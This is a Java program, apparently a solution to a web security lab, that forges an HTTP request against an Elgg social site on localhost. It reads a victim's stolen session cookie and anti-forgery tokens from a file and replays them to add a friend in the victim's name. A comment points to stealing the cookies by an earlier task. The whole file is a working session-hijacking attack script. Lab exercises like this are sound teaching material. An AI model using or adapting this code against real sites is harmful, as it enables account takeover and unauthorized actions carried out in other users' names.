import java.io.*;
import java.net.*;
public class HTTPSimpleForge {
	public static void main(String[] args) throws IOException {
		try {
			int responseCode;
			InputStream responseIn=null;

			BufferedReader txt = new BufferedReader(new FileReader("HTTPSimpleForge.txt"));
			String requestDetails = "&__elgg_ts="+ txt.readLine() + "&__elgg_token=" + txt.readLine();

			// URL to be forged.
			URL url = new URL ("http://localhost:8082/action/friends/add?friend=40"+requestDetails);

			// URLConnection instance is created to further parameterize a
			// resource request past what the state members of URL instance
			// can represent.
			HttpURLConnection urlConn = (HttpURLConnection) url.openConnection();
			if (urlConn instanceof HttpURLConnection) {
				urlConn.setConnectTimeout(60000);
				urlConn.setReadTimeout(90000);
			}

			// addRequestProperty method is used to add HTTP Header Information.
			// Here we add User-Agent HTTP header to the forged HTTP packet.
			// Add other necessary HTTP Headers yourself. Cookies should be stolen
			// using the method in task3.
			urlConn.addRequestProperty("User-agent", "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:23.0) Gecko/20100101 Firefox/23.0");
			urlConn.addRequestProperty("Cookie", txt.readLine());
			txt.close();

			// HttpURLConnection a subclass of URLConnection is returned by
			// url.openConnection() since the url is an http request.
			if (urlConn instanceof HttpURLConnection) {
				HttpURLConnection httpConn = (HttpURLConnection) urlConn;
				// Contacts the web server and gets the status code from
				// HTTP Response message.
				responseCode = httpConn.getResponseCode();
				System.out.println("Response Code = " + responseCode);
				// HTTP status code HTTP_OK means the response was
				// received sucessfully.
				if (responseCode == HttpURLConnection.HTTP_OK)
					// Get the input stream from url connection object.
					responseIn = urlConn.getInputStream();
				// Create an instance for BufferedReader
				// to read the response line by line.
				BufferedReader buf_inp = new BufferedReader(
						new InputStreamReader(responseIn));
				String inputLine;
				while((inputLine = buf_inp.readLine())!=null) {
					System.out.println(inputLine);
				}
			}
		} catch (MalformedURLException e) {
			e.printStackTrace();
		}
	}
}
